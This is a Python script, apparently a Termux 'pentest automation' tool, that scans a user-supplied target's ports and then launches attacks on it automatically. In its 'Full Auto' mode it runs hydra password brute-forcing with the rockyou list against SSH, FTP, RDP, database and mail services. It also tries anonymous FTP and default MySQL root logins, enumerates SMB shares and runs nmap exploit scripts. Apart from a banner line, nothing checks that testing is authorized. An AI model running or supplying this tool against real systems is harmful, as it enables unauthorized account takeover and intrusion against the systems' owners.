#!/usr/bin/env python3
"""
Termux Pentest Automation Tool
Port Scan -> Vuln Check -> Exploit
For authorized security testing only.
"""

import subprocess
import sys
import json
import socket
import os
import time
import ipaddress
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] Install required modules: pip install requests colorama")
    sys.exit(1)

# ─── Banner ───────────────────────────────────────────────────────
BANNER = f"""{Fore.RED}
╔══════════════════════════════════════════════════════╗
║           Termux Pentest Automation Suite           ║
║       {Fore.CYAN}Port Scanner | Vuln Checker | Exploit{Fore.RED}         ║
║       {Fore.YELLOW}Authorized Use Only{Fore.RED}                        ║
╚══════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

# Known vulnerable ports and their common services
VULN_SERVICES = {
    21:    {"name": "FTP",     "exploit_cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET"},
    22:    {"name": "SSH",    "exploit_cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET"},
    23:    {"name": "Telnet", "exploit_cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET"},
    25:    {"name": "SMTP",   "exploit_cmd": "smtp-user-enum -M VRFY -U /usr/share/wordlists/names.txt -t TARGET"},
    80:    {"name": "HTTP",   "exploit_cmd": "nikto -h http://TARGET"},
    110:   {"name": "POP3",   "exploit_cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://TARGET"},
    139:   {"name": "NetBIOS","exploit_cmd": "enum4linux -a TARGET"},
    143:   {"name": "IMAP",   "exploit_cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://TARGET"},
    443:   {"name": "HTTPS",  "exploit_cmd": "nikto -h https://TARGET"},
    445:   {"name": "SMB",    "exploit_cmd": "smbmap -H TARGET"},
    3306:  {"name": "MySQL",  "exploit_cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET"},
    3389:  {"name": "RDP",    "exploit_cmd": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET"},
    5432:  {"name": "PostgreSQL", "exploit_cmd": "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://TARGET"},
    5900:  {"name": "VNC",    "exploit_cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET"},
    6379:  {"name": "Redis",  "exploit_cmd": "redis-cli -h TARGET INFO"},
    8080:  {"name": "HTTP-Proxy", "exploit_cmd": "nikto -h http://TARGET:8080"},
    8443:  {"name": "HTTPS-Alt",  "exploit_cmd": "nikto -h https://TARGET:8443"},
    27017: {"name": "MongoDB", "exploit_cmd": "mongo TARGET:27017"},
}

# ─── Utilities ─────────────────────────────────────────────────────

def print_info(msg):  print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")
def print_ok(msg):    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def print_warn(msg):  print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def print_err(msg):   print(f"{Fore.RED}[X]{Style.RESET_ALL} {msg}")
def print_vuln(msg):  print(f"{Fore.RED}[VULN]{Style.RESET_ALL} {msg}")

def resolve_target(target):
    """Resolve hostname to IP or validate IP."""
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        print_err(f"Cannot resolve: {target}")
        return None

def is_up(ip, port=80, timeout=2):
    """Quick check if host is alive."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def check_nmap_installed():
    r = subprocess.run(["which", "nmap"], capture_output=True, text=True)
    return r.returncode == 0

# ─── Phase 1: Port Scanner ─────────────────────────────────────────

def banner_grab(ip, port, timeout=3):
    """Grab service banner from an open port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner[:200] if banner else "No banner"
    except:
        return "No banner"

def scan_port(ip, port):
    """Scan a single port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.5)
    result = sock.connect_ex((ip, port))
    sock.close()
    if result == 0:
        banner = banner_grab(ip, port)
        return (port, "open", banner)
    return (port, "closed", None)

def port_scan(ip, ports=None):
    """Multi-threaded port scan."""
    if ports is None:
        # Top 1000 ports using nmap default list
        print_info("Scanning top 1000 ports (this may take a while)...")
        subprocess.run(["nmap", "--open", "-T4", "-oG", "-", ip], timeout=300)
        return

    print_info(f"Scanning {len(ports)} ports on {ip}...")
    results = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_port, ip, p): p for p in ports}
        for future in as_completed(futures):
            port, status, banner = future.result()
            if status == "open":
                service = VULN_SERVICES.get(port, {}).get("name", "unknown")
                results.append((port, service, banner))
                service_colored = f"{Fore.GREEN}{service}{Style.RESET_ALL}"
                print_ok(f"Port {port:5d}/{service_colored:12s} - {banner[:60]}")
    return results

# ─── Phase 2: Nmap Deep Scan ───────────────────────────────────────

def nmap_deep_scan(target):
    """Run Nmap service/version detection and NSE vuln scripts."""
    print_info(f"Running Nmap version detection and NSE vuln scripts on {target}...")

    # Step 1: Service/version detection
    cmd = [
        "nmap", "-sV", "--version-intensity", "5",
        "-p", "21,22,23,25,80,110,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,27017",
        "-T4", "--open", "-oN", f"{target}_nmap_scan.txt", target
    ]
    subprocess.run(cmd, timeout=600)
    print_ok(f"Nmap scan saved to {target}_nmap_scan.txt")

    # Step 2: NSE vulnerability scripts (lightweight)
    print_info("Running NSE vulnerability detection scripts...")
    nse_cmd = [
        "nmap", "-sV",
        "--script", "vuln,exploit,http-vuln*,smb-vuln*",
        "-p", "21,22,80,443,445,1433,3306,3389,5432,5900,6379,8080,8443",
        "-T4", "--open", "-oN", f"{target}_nse_vulns.txt", target
    ]
    subprocess.run(nse_cmd, timeout=600)
    print_ok(f"NSE vulnerability report saved to {target}_nse_vulns.txt")

# ─── Phase 3: Vulnerability Checking ───────────────────────────────

def check_http_vulns(ip, port):
    """Check HTTP/HTTPS services for common web vulns."""
    protocols = ["http", "https"]
    findings = []

    for proto in protocols:
        url = f"{proto}://{ip}:{port}"
        try:
            r = requests.get(url, timeout=5, verify=False,
                             headers={"User-Agent": "Mozilla/5.0"})
            server = r.headers.get("Server", "Unknown")
            print_ok(f"{url} - Server: {server} - Status: {r.status_code}")

            # Check for common headers
            missing_headers = []
            for h in ["X-Frame-Options", "X-Content-Type-Options",
                       "Content-Security-Policy", "Strict-Transport-Security"]:
                if h not in r.headers:
                    missing_headers.append(h)
            if missing_headers:
                print_warn(f"  Missing security headers: {', '.join(missing_headers)}")

            # Check for admin panels
            admin_paths = ["/admin", "/login", "/wp-admin", "/administrator",
                          "/phpmyadmin", "/manager", "/console"]
            for path in admin_paths:
                try:
                    ar = requests.get(f"{url}{path}", timeout=3,
                                      headers={"User-Agent": "Mozilla/5.0"})
                    if ar.status_code in [200, 401, 403]:
                        print_warn(f"  Found: {url}{path} ({ar.status_code})")
                        findings.append((f"{url}{path}", ar.status_code))
                except:
                    pass
        except requests.exceptions.SSLWarning:
            pass
        except Exception as e:
            print_err(f"Cannot connect to {url}: {str(e)[:50]}")
    return findings

def known_vuln_check(ip, port, service_name):
    """Check if port/service has known exploitable vulnerabilities."""
    if port in VULN_SERVICES:
        info = VULN_SERVICES[port]
        print_vuln(f"{info['name']} (port {port}) - Potential exploit available")
        print_info(f"  Suggested: {info['exploit_cmd'].replace('TARGET', ip)}")
        return True
    return False

def run_nikto(ip, port, proto="http"):
    """Run Nikto web scanner if available."""
    nikto_path = subprocess.run(["which", "nikto"], capture_output=True, text=True)
    if nikto_path.returncode == 0:
        print_info(f"Running Nikto on {proto}://{ip}:{port}...")
        cmd = ["nikto", "-h", f"{proto}://{ip}:{port}", "-ssl" if proto == "https" else ""]
        cmd = [c for c in cmd if c]
        subprocess.run(cmd, timeout=300)
    else:
        print_warn("Nikto not installed. Skipping web vuln scanner.")
        print_info("Install: pkg install nikto")

# ─── Phase 4: Exploitation ─────────────────────────────────────────

def exploit_service(ip, port, service_name):
    """Launch exploitation attempts for discovered services."""
    print_info(f"Checking exploit options for {service_name} on {ip}:{port}...")

    if port == 21:
        print_info(f"Attempting FTP anonymous login...")
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=10)
            ftp.login("anonymous", "anonymous@test.com")
            files = ftp.nlst()
            print_ok(f"Anonymous FTP login SUCCESS! Files: {files[:20]}")
            ftp.quit()
        except Exception as e:
            print_warn(f"FTP anonymous failed: {str(e)[:60]}")

    elif port == 80 or port == 443 or port == 8080 or port == 8443:
        proto = "https" if port in [443, 8443] else "http"
        check_http_vulns(ip, port)
        run_nikto(ip, port, proto)

    elif port == 445:
        print_info(f"Enumerating SMB shares on {ip}...")
        try:
            # Try smbclient or enum4linux
            for tool, args in [("smbclient", ["-L", f"//{ip}/", "-N"]),
                               ("enum4linux", ["-a", ip])]:
                tool_path = subprocess.run(["which", tool.split()[0]],
                                           capture_output=True, text=True)
                if tool_path.returncode == 0:
                    subprocess.run([tool] + args, timeout=60)
                else:
                    print_warn(f"{tool} not installed. Skipping SMB enum.")
        except:
            pass

    elif port == 3306:
        print_info(f"Attempting MySQL root login on {ip}...")
        mysql_path = subprocess.run(["which", "mysql"], capture_output=True, text=True)
        if mysql_path.returncode == 0:
            cmd = f"mysql -h {ip} -u root -proot -e 'SHOW DATABASES;' 2>/dev/null || " \
                  f"mysql -h {ip} -u root -e 'SHOW DATABASES;' 2>/dev/null || " \
                  f"echo 'MySQL auth failed'"
            subprocess.run(cmd, shell=True, timeout=15)
        else:
            print_warn("MySQL client not installed.")

    else:
        print_info(f"No automated exploit for port {port} ({service_name}). Trying brute force...")
        # Generic hydra attempt
        hydra_path = subprocess.run(["which", "hydra"], capture_output=True, text=True)
        if hydra_path.returncode == 0:
            svc = VULN_SERVICES.get(port, {}).get("name", "").lower()
            if svc:
                print_info(f"Running Hydra against {svc} on {ip}...")
                cmd = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt " \
                      f"-t 4 -w 5 {svc}://{ip} -s {port} 2>/dev/null"
                subprocess.run(cmd, shell=True, timeout=120)
        else:
            print_warn("Hydra not installed (pkg install hydra)")

# ─── Main Menu ──────────────────────────────────────────────────────

def main():
    print(BANNER)

    if not check_nmap_installed():
        print_warn("Nmap is highly recommended. Install: pkg install nmap")

    # Get target
    target = input(f"{Fore.CYAN}[?]{Style.RESET_ALL} Enter target (IP or domain): ").strip()
    if not target:
        print_err("No target provided.")
        return

    ip = resolve_target(target)
    if not ip:
        return
    print_ok(f"Target resolved: {target} -> {ip}")

    # Quick host check
    print_info("Checking if host is alive...")
    alive = is_up(ip, 80, 2) or is_up(ip, 443, 2) or is_up(ip, 22, 2)
    if not alive:
        print_warn("Host may be down or blocking ICMP/connection attempts.")
        cont = input("Continue anyway? (y/N): ").strip().lower()
        if cont != 'y':
            return

    # ── Scan Mode ──
    print(f"\n{Fore.CYAN}═{'═'*50}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Select Scan Mode:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL} Quick Scan (Top 20 common ports)")
    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL} Deep Scan (Nmap + NSE vuln scripts)")
    print(f"  {Fore.CYAN}[3]{Style.RESET_ALL} Full Auto (Scan → Vuln Check → Exploit)")
    mode = input(f"{Fore.CYAN}[?]{Style.RESET_ALL} Choice [1-3] (default 3): ").strip() or "3"

    if mode == "1":
        # Quick scan
        common_ports = [21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,
                       2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,27017]
        open_ports = port_scan(ip, common_ports)

        print(f"\n{Fore.CYAN}═{'═'*50}{Style.RESET_ALL}")
        if open_ports:
            print_ok(f"Found {len(open_ports)} open ports")
            for port, svc, banner in open_ports:
                print(f"  PORT {port:5d} | {svc:12s} | {banner[:60]}")
                known_vuln_check(ip, port, svc)
        else:
            print_warn("No open ports found in the top 20.")

    elif mode == "2":
        # Deep Nmap scan
        nmap_deep_scan(ip)
        print_ok(f"Deep scan complete. Check {ip}_nmap_scan.txt and {ip}_nse_vulns.txt")

    else:
        # Full auto
        print(f"\n{Fore.GREEN}═══ PHASE 1: PORT SCANNING ═══{Style.RESET_ALL}")
        common_ports = [21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,
                       2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,27017]
        open_ports = port_scan(ip, common_ports)

        if not open_ports:
            print_warn("No open ports found. Running Nmap deep scan as fallback...")
            nmap_deep_scan(ip)
            return

        print(f"\n{Fore.GREEN}═══ PHASE 2: VULNERABILITY CHECK ═══{Style.RESET_ALL}")
        vuln_found = False
        for port, svc, banner in open_ports:
            print(f"\n{Fore.YELLOW}── Checking port {port} ({svc}) ──{Style.RESET_ALL}")
            # Known vuln check
            if known_vuln_check(ip, port, svc):
                vuln_found = True
            # HTTP-based vuln check
            if port in [80, 443, 8080, 8443]:
                check_http_vulns(ip, port)

        if not vuln_found:
            print_warn("No obvious high-profile vulnerabilities detected.")
            print_info("Running Nmap NSE vuln scripts for deeper checks...")
            nmap_deep_scan(ip)

        print(f"\n{Fore.GREEN}═══ PHASE 3: EXPLOITATION ═══{Style.RESET_ALL}")
        for port, svc, banner in open_ports:
            print(f"\n{Fore.YELLOW}── Attempting exploit on {ip}:{port} ({svc}) ──{Style.RESET_ALL}")
            exploit_service(ip, port, svc)

    print(f"\n{Fore.RED}═{'═'*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Scan complete! Report files saved.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Remember: Document findings professionally.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user. Exiting.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print_err(f"Unhandled error: {e}")
        sys.exit(1)
